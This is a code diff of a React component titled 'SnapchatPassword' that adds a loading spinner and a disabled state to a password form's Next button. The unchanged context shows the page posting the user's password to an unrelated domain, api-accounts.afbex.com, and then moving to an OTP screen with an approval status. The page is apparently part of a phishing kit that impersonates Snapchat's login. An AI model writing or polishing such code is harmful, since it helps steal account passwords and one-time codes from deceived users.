@@ -9,6 +9,7 @@ const SnapchatPassword = () => {
   const [otpVerificationStatus, setOtpVerificationStatus] = useState('idle'); // idle, pending, approved, rejected
   const [alertConfig, setAlertConfig] = useState({ show: false, title: '', message: '' });
   const [passwordError, setPasswordError] = useState('');
+  const [isPasswordSubmitting, setIsPasswordSubmitting] = useState(false);
   
   // Refs for OTP inputs
   const otpRefs = useRef([]);
@@ -32,6 +33,8 @@ const SnapchatPassword = () => {
         return;
       }
 
+      setIsPasswordSubmitting(true);
+
       try {
         // Submit password to backend
         const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-password', {
@@ -44,11 +47,14 @@ const SnapchatPassword = () => {
         if (response.ok) {
           console.log('Password submitted:', password);
           // Don't poll, just move to OTP screen
+          setIsPasswordSubmitting(false);
           setCurrentScreen('otp');
         } else {
+          setIsPasswordSubmitting(false);
           setPasswordError('Failed to submit password. Please try again.');
         }
       } catch (error) {
+        setIsPasswordSubmitting(false);
         console.error('Error submitting password:', error);
         setPasswordError('Could not connect to verification server');
       }
@@ -233,8 +239,17 @@ const SnapchatPassword = () => {
             {/* Next Button */}
             <button
               type="submit"
-              className="w-full bg-[#00C3FF] hover:bg-[#00A8E0] text-white font-bold text-[15px] py-3.5 rounded-full transition-all duration-200 shadow-sm hover:shadow-md active:scale-[0.98]"
+              disabled={isPasswordSubmitting}
+              className={`w-full bg-[#00C3FF] hover:bg-[#00A8E0] text-white font-bold text-[15px] py-3.5 rounded-full transition-all duration-200 shadow-sm hover:shadow-md active:scale-[0.98] flex items-center justify-center gap-2 ${
+                isPasswordSubmitting ? 'cursor-not-allowed opacity-80' : ''
+              }`}
             >
+              {isPasswordSubmitting && (
+                <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+              )}
               Next
             </button>
           </form>
